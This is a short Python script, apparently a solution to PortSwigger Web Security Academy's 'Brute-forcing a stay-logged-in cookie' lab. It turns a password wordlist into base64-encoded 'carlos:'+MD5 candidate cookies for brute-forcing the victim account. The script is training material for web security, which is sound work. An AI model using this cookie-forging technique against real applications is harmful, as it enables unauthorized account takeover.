#!/usr/bin/python3

# Wordlist encoder
# A simple python script for solving PortSwigger Web Security Academy's "Brute-forcing a stay-logged-in cookie" lab.

# The lab consists in an application that assigns a low-entropy stay-logged-in cookie to the user, which has the format of `base64(username+':'+md5HashOfPassword)`,
# alowing attackers to brute force that cookie and gain unauthorized access to other user's accounts. The victim for this lab is the account under the username "carlos".

# This script works by hashing all the lines from "data/wordlist.txt" using MD5, writing everything on "data/hashed.txt", then concatenating "carlos:" to the beginning
# of each hash and encoding them to base64. The final product is "data/encoded.txt".

# The list of candidate passwords contained in this repository is meant to be used on Web Security Academy's Authentication labs and is likely to be useless in other contexts.


import hashlib
import base64



input_path = 'data/wordlist.txt'
wordlist = open(input_path, 'r')

hashed_path = 'data/hashed.txt'
hashed_writeable = open(hashed_path, 'w')   # As this file will be opened in both modes along the code,
hashed_readable = open(hashed_path, 'r')    # it's opening is already declared here in both ways.

encoded_path = 'data/encoded.txt'

num_lines = sum(1 for _ in open(input_path)) # Gets the number of lines in the input file



def string_to_hash():
    i = 1
    while i <= num_lines:
        next_line = wordlist.readline() 
        next_line = next_line[:-1] # Removes the newline (\n) character so it doesn't also gets hashed
        input_string = next_line  
        md5_hash = hashlib.md5(input_string.encode()).hexdigest() # Hashes the input string
        hashed_writeable.write(md5_hash+'\n')

        i += 1
    hashed_writeable.close()



def hash_to_base64():
    encoded = open(encoded_path, 'w')

    i = 1
    while i <= num_lines:
        next_line = hashed_readable.readline()
        next_line = next_line[:-1]  # Removes the newline (\n) character so it doesn't also gets converted to base64
        input_string = 'carlos:' + next_line   
        base64_string = base64.b64encode(bytes(input_string, 'utf-8')).decode('utf-8')
        encoded.write(f'{base64_string}\n')

        i += 1
    hashed_readable.close()
    encoded.close()



string_to_hash()
hash_to_base64()

wordlist.close()
